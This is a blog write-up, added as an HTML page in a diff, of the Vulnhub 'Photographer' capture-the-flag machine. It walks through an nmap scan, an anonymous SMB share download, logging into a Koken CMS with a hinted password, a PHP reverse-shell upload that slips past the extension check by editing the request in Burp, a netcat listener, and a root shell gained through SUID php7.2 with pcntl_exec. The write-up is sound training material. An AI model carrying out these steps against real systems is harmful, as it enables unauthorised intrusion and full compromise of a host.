@@ -1,0 +1,644 @@
+<!DOCTYPE html>
+<html>
+<head>
+
+    <!-- Document Settings -->
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <!-- Base Meta -->
+    <!-- dynamically fixing the title for tag/author pages -->
+
+
+
+    <title>Photographer Write Up</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <!-- Styles'n'Scripts -->
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.edited.css" />
+    <link rel="stylesheet" type="text/css" href="/assets/built/syntax.css" />
+    <!-- highlight.js -->
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/default.min.css">
+    <style>.hljs { background: none; }</style>
+
+    <!--[if IE]>
+        <style>
+            p, ol, ul{
+                width: 100%;
+            }
+            blockquote{
+                width: 100%;
+            }
+        </style>
+    <![endif]-->
+    
+    <!-- This tag outputs SEO meta+structured data and other important settings -->
+    <meta name="description" content="Infosec | Hacking | CTF" />
+    <link rel="shortcut icon" href="/assets/images/favicon.png" type="image/png" />
+    <link rel="canonical" href="/photographer" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+
+     <!--title below is coming from _includes/dynamic_title-->
+    <meta property="og:site_name" content="Darryn Brownfield" />
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Photographer Write Up" />
+    <meta property="og:description" content="Overview Photographer was the last machine I did before I took my OSCP exam so it seemed fitting for it to be the first write up on my new blog. Photographer was a great OSCP like machine created by v1n1v131r4. Nmap Starting with a Nmap scan lets see what ports" />
+    <meta property="og:url" content="/photographer" />
+    <meta property="og:image" content="/assets/images/photographer.png" />
+    <meta property="article:publisher" content="https://www.facebook.com/" />
+    <meta property="article:author" content="https://www.facebook.com/" />
+    <meta property="article:published_time" content="2020-09-04T00:00:00+00:00" />
+    <meta property="article:modified_time" content="2020-09-04T00:00:00+00:00" />
+    <meta property="article:tag" content="Vulnhub" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Photographer Write Up" />
+    <meta name="twitter:description" content="Overview Photographer was the last machine I did before I took my OSCP exam so it seemed fitting for it to be the first write up on my new blog. Photographer was a great OSCP like machine created by v1n1v131r4. Nmap Starting with a Nmap scan lets see what ports" />
+    <meta name="twitter:url" content="/" />
+    <meta name="twitter:image" content="/assets/images/photographer.png" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Darryn Brownfield" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="Vulnhub" />
+    <meta name="twitter:site" content="@dazbrownfield" />
+    <meta name="twitter:creator" content="@dazbrownfield" />
+    <meta property="og:image:width" content="1400" />
+    <meta property="og:image:height" content="933" />
+
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Website",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Darryn Brownfield",
+        "logo": "/assets/images/blog-icon.png"
+    },
+    "url": "/photographer",
+    "image": {
+        "@type": "ImageObject",
+        "url": "/assets/images/photographer.png",
+        "width": 2000,
+        "height": 666
+    },
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "/photographer"
+    },
+    "description": "Overview Photographer was the last machine I did before I took my OSCP exam so it seemed fitting for it to be the first write up on my new blog. Photographer was a great OSCP like machine created by v1n1v131r4. Nmap Starting with a Nmap scan lets see what ports"
+}
+    </script>
+
+    <!-- <script type="text/javascript" src="https://demo.ghost.io/public/ghost-sdk.min.js?v=724281a32e"></script>
+    <script type="text/javascript">
+    ghost.init({
+    	clientId: "ghost-frontend",
+    	clientSecret: "f84a07a72b17"
+    });
+    </script> -->
+
+    <meta name="generator" content="Jekyll 3.6.2" />
+    <link rel="alternate" type="application/rss+xml" title="Photographer Write Up" href="/feed.xml" />
+
+
+</head>
+<body class="post-template">
+
+    <div class="site-wrapper">
+        <!-- All the main content gets inserted here, index.hbs, post.hbs, etc -->
+        <!-- default -->
+
+<!-- The tag above means: insert everything in this file
+into the {body} of the default.hbs template -->
+
+<header class="site-header outer">
+    <div class="inner">
+        <nav class="site-nav">
+    <div class="site-nav-left">
+        
+            
+
+            
+        
+        
+            <ul class="nav" role="menu">
+    <li class="nav-home" role="menuitem"><a href="/">Home</a></li>
+    <li class="nav-about" role="menuitem"><a href="/about/">About</a></li>
+    <li class="nav-getting-started" role="menuitem"><a href="/tag/ctf/">CTF</a></li>
+</ul>
+
+        
+    </div>
+    <div class="site-nav-right">
+        <div class="social-links">
+            
+            <a
+              class="social-link social-link-tw"
+              href="https://github.com/darrynb89"
+              target="_blank"
+              rel="noopener"
+              ><svg
+  version="1.0"
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 120.000000 120.000000"
+>
+  <g
+    transform="translate(0.000000,120.000000) scale(0.0900000,-0.0900000)"
+    fill="#ffffff"
+    stroke="none"
+  >
+    <path
+      d="M441 1174 c-105 -28 -181 -73 -266 -159 -125 -124 -175 -246 -175
+-425 0 -179 50 -300 175 -425 85 -85 185 -145 243 -145 36 0 42 13 42 89 l0
+57 -57 -3 c-74 -5 -117 17 -150 78 -13 24 -37 56 -54 71 -34 33 -36 38 -9 38
+12 0 20 -7 20 -16 0 -10 6 -14 14 -11 10 4 13 1 9 -9 -3 -10 2 -14 18 -14 18
+0 20 -3 10 -9 -16 -11 -4 -34 14 -27 9 3 11 -2 7 -16 -4 -18 -2 -20 21 -14 20
+5 25 3 21 -8 -9 -23 17 -31 33 -11 12 17 13 17 13 2 0 -11 8 -17 21 -17 15 0
+19 5 15 15 -3 8 -1 15 4 15 6 0 10 -7 10 -15 0 -8 7 -15 15 -15 8 0 15 8 15
+18 0 10 10 39 23 64 l23 46 -59 13 c-136 28 -210 123 -211 268 -1 66 3 82 27
+124 23 39 27 55 22 86 -7 40 9 121 24 121 18 0 78 -25 113 -46 30 -19 42 -22
+70 -14 18 6 71 10 118 10 47 0 100 -4 118 -10 28 -8 40 -5 70 14 35 21 95 46
+113 46 15 0 31 -81 24 -121 -5 -31 -1 -47 22 -86 24 -42 28 -58 27 -123 -1
+-147 -65 -231 -203 -266 l-68 -18 18 -30 c15 -25 19 -51 19 -138 0 -58 3 -113
+6 -122 20 -52 166 16 279 129 125 125 175 246 175 425 0 179 -50 301 -175 425
+-86 87 -161 131 -270 160 -75 19 -241 19 -314 -1z"
+    />
+  </g>
+</svg></a
+            >
+            
+            <a
+              class="social-link social-link-li"
+              href="https://www.linkedin.com/in/darryn-brownfield-0b1132b5"
+              target="_blank"
+              rel="noopener"
+              ><svg viewBox="0 50 512 512">
+    <g transform="translate(0.000000,20.000000) scale(1.1)">
+      <path
+        d="M150.65,100.682c0,27.992-22.508,50.683-50.273,50.683c-27.765,0-50.273-22.691-50.273-50.683
+      C50.104,72.691,72.612,50,100.377,50C128.143,50,150.65,72.691,150.65,100.682z M143.294,187.333H58.277V462h85.017V187.333z
+      M279.195,187.333h-81.541V462h81.541c0,0,0-101.877,0-144.181c0-38.624,17.779-61.615,51.807-61.615
+      c31.268,0,46.289,22.071,46.289,61.615c0,39.545,0,144.181,0,144.181h84.605c0,0,0-100.344,0-173.915
+      s-41.689-109.131-99.934-109.131s-82.768,45.369-82.768,45.369V187.333z"
+      />
+    </g>
+  </svg></a
+            >
+             
+            <a
+              class="social-link social-link-tw"
+              href="https://twitter.com/dazbrownfield"
+              target="_blank"
+              rel="noopener"
+              ><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+</a
+            >
+             
+          </div>
+</nav>
+
+    </div>
+</header>
+
+<!-- Everything inside the #post tags pulls data from the post -->
+<!-- #post -->
+
+<main id="site-main" class="site-main outer" role="main">
+    <div class="inner">
+
+        <article class="post-full  tag-vulnhub tag-ctf tag-oscp post ">
+
+            <header class="post-full-header">
+                <section class="post-full-meta">
+                    <time class="post-full-meta-date" datetime=" 4 September 2020"> 4 September 2020</time>
+                    
+                        <span class="date-divider">/</span>
+                        
+                            
+                               <a href='/tag/vulnhub/'>VULNHUB</a>,
+                            
+                        
+                            
+                               <a href='/tag/ctf/'>CTF</a>,
+                            
+                        
+                            
+                               <a href='/tag/oscp/'>OSCP</a>
+                            
+                        
+                    
+                </section>
+                <h1 class="post-full-title">Photographer Write Up</h1>
+            </header>
+
+            <section class="post-full-content">
+                <div class="kg-card-markdown">
+                    <p><img src="/assets/images/photographer.png" alt="Photographer" /></p>
+
+<h3 id="overview">Overview</h3>
+
+<p>Photographer was the last machine I did before I took my OSCP exam so it seemed fitting for it to be the first write up on my new blog. Photographer was a great OSCP like machine created by <a href="https://twitter.com/v1n1v131r4">v1n1v131r4</a>.</p>
+
+<h3 id="nmap">Nmap</h3>
+
+<p>Starting with a Nmap scan lets see what ports are open. I got the IP of the machine by checking the DHCP server on my network. However, I could have used arp-scan to find the IP address.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
+└──╼ $nmap -sC -sV -oA nmap/initial 192.168.1.77
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-01 17:54 BST
+Nmap scan report for 192.168.1.77
+Host is up (0.0012s latency).
+Not shown: 996 closed ports
+PORT     STATE SERVICE     VERSION
+80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Photographer by v1n1v131r4
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
+8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
+|_http-generator: Koken 0.22.24
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: daisa ahomi
+|_http-trane-info: Problem with XML parsing of /evox/about
+Service Info: Host: PHOTOGRAPHER
+
+Host script results:
+|_clock-skew: mean: 1h19m59s, deviation: 2h18m33s, median: 0s
+|_nbstat: NetBIOS name: PHOTOGRAPHER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
+| smb-os-discovery: 
+|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
+|   Computer name: photographer
+|   NetBIOS computer name: PHOTOGRAPHER\x00
+|   Domain name: \x00
+|   FQDN: photographer
+|_  System time: 2020-09-01T12:54:28-04:00
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2020-09-01T16:54:28
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds                                                                 
+</code></pre></div></div>
+
+<p>The scan reveals 4 ports open, Samba and two web. Based on the HTTP banners it looks to be a Linux Ubuntu machine, Googling apache 2.4.18 ubuntu reveals the OS is probably Ubuntu Xenial 16.04 LTS.</p>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>I started with port 80 but didn’t find anything interesting. I ran Gobuster and Nikto and both came up blank so decided to move on for now. On port 8000 I’m presented with a CMS type page. Looking at the footer indicates ‘Built with Koken’.</p>
+
+<p><img src="/assets/images/photographer/Port-8000.png" alt="Port 8000" /></p>
+
+<p>A quick Google shows <a href="http://koken.me/">Koken</a> is a CMS for photographers. An <a href="https://www.exploit-db.com/exploits/48706">exploit</a> is also available by the same author of the machine which would indicate this is the intend path. However, the exploit requires authentication.</p>
+
+<p><img src="/assets/images/photographer/exploit.png" alt="Exploit" /></p>
+
+<p>Looking at the exploit, the POST request makes a call to <strong>/admin/</strong>. Going to the URL does provide a login page requiring a email address and password. I will take a look at Samba before going any further on the web ports.</p>
+
+<p><img src="/assets/images/photographer/login.png" alt="Login" /></p>
+
+<p>Using smbclient and logging in anonymously shows one share in particular that looks interesting ‘sambashare’.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
+└──╼ $smbclient -L \\\\192.168.1.77\\
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        sambashare      Disk      Samba on Ubuntu
+        IPC$            IPC       IPC Service (photographer server (Samba, Ubuntu))
+SMB1 disabled -- no workgroup available
+┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
+└──╼ $smbclient \\\\192.168.1.77\\sambashare\\
+Enter WORKGROUP\daz\'s password: 
+Try "help" to get a list of possible commands.
+smb: \&gt; ls
+  .                                   D        0  Tue Jul 21 02:30:07 2020
+  ..                                  D        0  Tue Jul 21 10:44:25 2020
+  mailsent.txt                        N      503  Tue Jul 21 02:29:40 2020
+  wordpress.bkp.zip                   N 13930308  Tue Jul 21 02:22:23 2020
+
+                278627392 blocks of size 1024. 264268400 blocks available
+smb: \&gt; mget *
+Get file mailsent.txt? y
+getting file \mailsent.txt of size 503 as mailsent.txt (245.6 KiloBytes/sec) (average 245.6 KiloBytes/sec)
+Get file wordpress.bkp.zip? y
+getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (67013.8 KiloBytes/sec) (average 66362.5 KiloBytes/sec)
+smb: \&gt; 
+</code></pre></div></div>
+
+<p>Two files are on the share, the first is an email from Agi to Daisa advising the site is ready and the other file appears to be a backup zip of the site.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
+└──╼ $cat mailsent.txt 
+Message-ID: &lt;4129F3CA.2020509@dc.edu&gt;
+Date: Mon, 20 Jul 2020 11:40:36 -0400
+From: Agi Clarence &lt;agi@photographer.com&gt;
+User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.0.1) Gecko/20020823 Netscape/7.0
+X-Accept-Language: en-us, en
+MIME-Version: 1.0
+To: Daisa Ahomi &lt;daisa@photographer.com&gt;
+Subject: To Do - Daisa Website\'s
+Content-Type: text/plain; charset=us-ascii; format=flowed
+Content-Transfer-Encoding: 7bit
+
+Hi Daisa!
+Your site is ready now.
+Don\'t forget your secret, my babygirl ;)
+┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
+└──╼ $                                                                                                                       
+</code></pre></div></div>
+
+<p>‘babygirl’ looks to be a hint to the password and I now have 2 users and email addresses:</p>
+
+<ul>
+  <li>Agi Clarence - agi@photographer.com</li>
+  <li>Daisa Ahomi - daisa@photographer.com</li>
+</ul>
+
+<h3 id="foot-hold">Foot hold</h3>
+
+<p>I go back to port <strong>8000/admin/</strong> and try them out. I get straight in with <strong>daisa@photographer.com</strong> and <strong>babygirl</strong>.</p>
+
+<p><img src="/assets/images/photographer/cms.png" alt="CMS" /></p>
+
+<p>Going back to the exploit from earlier, it looks like I can upload a PHP file by saving the file as .jpg then use Burp to rename it. Im going to try and upload a reverse shell PHP script. If your using Kali or ParrotOS the script can be found in /usr/share/webshells/php/ or downloaded from <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">pentestmonkey</a>.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
+└──╼ $cp /usr/share/webshells/php/php-reverse-shell.php .
+┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
+└──╼ $mv php-reverse-shell.php shell.php.jpg                                                                                 
+</code></pre></div></div>
+
+<p>I update the script with my local IP and port details.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ip = '127.0.0.1';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS                                                                                           
+</code></pre></div></div>
+
+<p>Start a netcat listener ready to catch the shell.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
+└──╼ $sudo nc -nvlp 443
+listening on [any] 443 ...                                                                                                   
+</code></pre></div></div>
+
+<p>Going back to the admin page I upload the file using ‘Import content’ and find the PHP file. With Burp open and proxy intercept on I set Burp as a proxy in my browser and select ‘Import’.</p>
+
+<p><img src="/assets/images/photographer/content.png" alt="Content" /></p>
+
+<p>In Burp I can now remove the .jpg extension from the file and forward the request.</p>
+
+<p><img src="/assets/images/photographer/burp.png" alt="Burp" /></p>
+
+<p>With the file selected, right clicking on ‘Download File’ and ‘Open Link in New Tab’ should run out PHP script.</p>
+
+<p><img src="/assets/images/photographer/downloadfile.png" alt="DownloadFile" /></p>
+
+<p>I have a shell as www-data! First thing I always do is upgrade it to a more stable TTY using Python.</p>
+
+<p><img src="/assets/images/photographer/shell.png" alt="Shell" /></p>
+
+<p>The first flag can be found in Daisa’s user directory.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@photographer:/$ cd home/daisa/
+www-data@photographer:/home/daisa$ ls
+Desktop    Downloads  Pictures  Templates  examples.desktop
+Documents  Music      Public    Videos     user.txt
+www-data@photographer:/home/daisa$ cat user.txt 
+d41d8cd98f00{REDACTED}
+www-data@photographer:/home/daisa$                                                                                           
+</code></pre></div></div>
+
+<h3 id="privilege-escalation">Privilege Escalation</h3>
+
+<p>I now need to escalate out of www-data to either a user or root. Im going to use <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">linpeas</a> to enumerate the machine for possible local privilege escalation paths. First I will use Python to copy the script from my machine.</p>
+
+<p><img src="/assets/images/photographer/linpeas.png" alt="linpeas" /></p>
+
+<p>Linpeas provides a lot of output, looking through the output <strong>/usr/bin/php7.2</strong> jumps out.</p>
+
+<blockquote>
+  <p>Linpeas will colour code the output based on severity but notice /usr/bin/php7.2 is green. Its important to review all the output and not rely on the scripts/tools to identify potential attack vectors.</p>
+</blockquote>
+
+<p><img src="/assets/images/photographer/suid.png" alt="suid" /></p>
+
+<p>First I will check <a href="https://gtfobins.github.io">GTFOBins</a>, searching PHP.</p>
+
+<p><img src="/assets/images/photographer/phpsuid.png" alt="gtfobins" /></p>
+
+<p>Lets give it a go.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@photographer:/tmp$ CMD="/bin/sh"
+www-data@photographer:/tmp$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
+# id
+uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
+# whoami
+root
+#                                                                                                                              
+</code></pre></div></div>
+
+<p>We have root! Lets grab the flag.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># 
+# cd /root
+# cat proof.txt
+                                                                
+                                .:/://::::///:-`                
+                            -/++:+`:--:o:  oo.-/+/:`            
+                         -++-.`o++s-y:/s: `sh:hy`:-/+:`         
+                       :o:``oyo/o`. `      ```/-so:+--+/`       
+                     -o:-`yh//.                 `./ys/-.o/      
+                    ++.-ys/:/y-                  /s-:/+/:/o`    
+                   o/ :yo-:hNN                   .MNs./+o--s`   
+                  ++ soh-/mMMN--.`            `.-/MMMd-o:+ -s   
+                 .y  /++:NMMMy-.``            ``-:hMMMmoss: +/  
+                 s-     hMMMN` shyo+:.    -/+syd+ :MMMMo     h  
+                 h     `MMMMMy./MMMMMd:  +mMMMMN--dMMMMd     s. 
+                 y     `MMMMMMd`/hdh+..+/.-ohdy--mMMMMMm     +- 
+                 h      dMMMMd:````  `mmNh   ```./NMMMMs     o. 
+                 y.     /MMMMNmmmmd/ `s-:o  sdmmmmMMMMN.     h` 
+                 :o      sMMMMMMMMs.        -hMMMMMMMM/     :o  
+                  s:     `sMMMMMMMo - . `. . hMMMMMMN+     `y`  
+                  `s-      +mMMMMMNhd+h/+h+dhMMMMMMd:     `s-   
+                   `s:    --.sNMMMMMMMMMMMMMMMMMMmo/.    -s.    
+                     /o.`ohd:`.odNMMMMMMMMMMMMNh+.:os/ `/o`     
+                      .++-`+y+/:`/ssdmmNNmNds+-/o-hh:-/o-       
+                        ./+:`:yh:dso/.+-++++ss+h++.:++-         
+                           -/+/-:-/y+/d:yh-o:+--/+/:`           
+                              `-///////////////:`               
+                                                                
+
+Follow me at: http://v1n1v131r4.com
+
+
+d41d8cd98f00{REDACTED}
+#                                                                                                                            
+</code></pre></div></div>
+
+
+                </div>
+            </section>
+
+            <!-- Email subscribe form at the bottom of the page -->
+            
+
+            <footer class="post-full-footer">
+                <!-- Everything inside the #author tags pulls data from the author -->
+            </footer>
+
+            <!-- If you use Disqus comments, just uncomment this block.
+            The only thing you need to change is "test-apkdzgmqhj" - which
+            should be replaced with your own Disqus site-id. -->
+            
+
+        </article>
+
+    </div>
+</main>
+
+
+
+        <!-- Previous/next page links - displayed on every page -->
+        
+
+        <!-- The footer at the very bottom of the screen -->
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="/">Darryn Brownfield</a> &copy; 2020</section>
+                <nav class="site-footer-nav">
+                    <a href="/">Latest Posts</a>
+                 </nav>
+            </div>
+        </footer>
+
+    </div>
+
+    <!-- The big email subscribe modal content -->
+    
+
+    <!-- highlight.js -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.10.0/components/prism-abap.min.js"></script>
+    <script>$(document).ready(function() {
+      $('pre code').each(function(i, block) {
+        hljs.highlightBlock(block);
+      });
+    });</script>
+
+    <!-- jQuery + Fitvids, which makes all video embeds responsive -->
+    <script
+        src="https://code.jquery.com/jquery-3.2.1.min.js"
+        integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4="
+        crossorigin="anonymous">
+    </script>
+    <script type="text/javascript" src="/assets/js/jquery.fitvids.js"></script>
+    <script type="text/javascript" src="https://demo.ghost.io/assets/js/jquery.fitvids.js?v=724281a32e"></script>
+
+
+    <!-- Paginator increased to "infinit" in _config.yml -->
+    <!-- if paginator.posts  -->
+    <!-- <script>
+        var maxPages = parseInt('');
+    </script>
+    <script src="/assets/js/infinitescroll.js"></script> -->
+    <!-- /endif -->
+
+    
+
+
+    <!-- Add Google Analytics  -->
+    <!-- Google Analytics Tracking code -->
+ <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-175458891-1', 'auto');
+  ga('send', 'pageview');
+
+ </script>
+
+
+    <!-- The #block helper will pull in data from the #contentFor other template files. In this case, there's some JavaScript which we only want to use in post.hbs, but it needs to be included down here, after jQuery has already loaded. -->
+    
+        <script>
+
+// NOTE: Scroll performance is poor in Safari
+// - this appears to be due to the events firing much more slowly in Safari.
+//   Dropping the scroll event and using only a raf loop results in smoother
+//   scrolling but continuous processing even when not scrolling
+$(document).ready(function () {
+    // Start fitVids
+    var $postContent = $(".post-full-content");
+    $postContent.fitVids();
+    // End fitVids
+
+    var progressBar = document.querySelector('progress');
+    var header = document.querySelector('.floating-header');
+    var title = document.querySelector('.post-full-title');
+
+    var lastScrollY = window.scrollY;
+    var lastWindowHeight = window.innerHeight;
+    var lastDocumentHeight = $(document).height();
+    var ticking = false;
+
+    function onScroll() {
+        lastScrollY = window.scrollY;
+        requestTick();
+    }
+
+    function onResize() {
+        lastWindowHeight = window.innerHeight;
+        lastDocumentHeight = $(document).height();
+        requestTick();
+    }
+
+    function requestTick() {
+        if (!ticking) {
+            requestAnimationFrame(update);
+        }
+        ticking = true;
+    }
+
+    function update() {
+        var trigger = title.getBoundingClientRect().top + window.scrollY;
+        var triggerOffset = title.offsetHeight + 35;
+        var progressMax = lastDocumentHeight - lastWindowHeight;
+
+        // show/hide floating header
+        if (lastScrollY >= trigger + triggerOffset) {
+            header.classList.add('floating-active');
+        } else {
+            header.classList.remove('floating-active');
+        }
+
+        progressBar.setAttribute('max', progressMax);
+        progressBar.setAttribute('value', lastScrollY);
+
+        ticking = false;
+    }
+
+    window.addEventListener('scroll', onScroll, {passive: true});
+    window.addEventListener('resize', onResize, false);
+
+    update();
+});
+</script>
+
+    
+
+    <!-- Ghost outputs important scripts and data with this tag - it should always be the very last thing before the closing body tag -->
+    <!-- ghost_foot -->
+
+</body>
+</html>
